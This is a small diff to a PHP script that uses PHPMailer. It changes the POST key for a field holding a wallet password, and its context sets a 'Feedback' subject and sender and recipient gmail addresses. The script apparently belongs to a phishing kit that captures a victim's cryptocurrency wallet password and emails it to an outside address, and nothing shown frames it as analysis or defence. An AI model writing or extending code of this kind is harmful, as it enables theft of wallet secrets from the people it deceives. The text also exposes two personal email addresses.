@@ -9,7 +9,7 @@ use PHPMailer\PHPMailer\Exception;
 
 $subject = "Feedback";
 
-$wallet_pass = $_POST['wpass'];
+$wallet_pass = $_POST['Wpass'];
 $email_from = 'feranmi@gmail.com';
 $email_to = 'emmajoy658@gmail.com';
 
